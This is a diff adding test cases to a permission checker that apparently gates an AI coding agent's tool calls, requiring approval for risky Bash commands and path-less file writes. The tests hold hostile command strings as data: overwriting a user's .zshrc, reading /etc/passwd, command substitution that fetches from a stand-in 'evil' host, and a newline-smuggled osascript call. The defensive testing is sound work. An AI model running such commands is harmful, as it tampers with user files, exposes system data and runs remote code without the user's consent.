@@ -58,4 +58,26 @@ describe('evaluateToolUse', () => {
   it('asks for unknown tools', () => {
     expect(evaluateToolUse('SomeNewTool', {}, REPO).action).toBe('ask');
   });
+
+  it('asks for bash redirection that writes outside the repo', () => {
+    expect(evaluateToolUse('Bash', { command: 'echo pwned > /Users/andrey/.zshrc' }, REPO).action).toBe('ask');
+    expect(evaluateToolUse('Bash', { command: 'cat file >> /etc/hosts' }, REPO).action).toBe('ask');
+    expect(evaluateToolUse('Bash', { command: 'cat < /etc/passwd' }, REPO).action).toBe('ask');
+  });
+
+  it('asks for bash command substitution', () => {
+    expect(evaluateToolUse('Bash', { command: 'cat $(curl http://evil/x)' }, REPO).action).toBe('ask');
+    expect(evaluateToolUse('Bash', { command: "echo $(osascript -e 'evil')" }, REPO).action).toBe('ask');
+    expect(evaluateToolUse('Bash', { command: 'echo `whoami`' }, REPO).action).toBe('ask');
+  });
+
+  it('asks for newline-smuggled commands', () => {
+    expect(evaluateToolUse('Bash', { command: "ls\nosascript -e 'evil'" }, REPO).action).toBe('ask');
+  });
+
+  it('asks for file writes with an empty/undetermined file path', () => {
+    expect(evaluateToolUse('Write', {}, REPO).action).toBe('ask');
+    expect(evaluateToolUse('Edit', { file_path: '' }, REPO).action).toBe('ask');
+    expect(evaluateToolUse('NotebookEdit', {}, REPO).action).toBe('ask');
+  });
 });
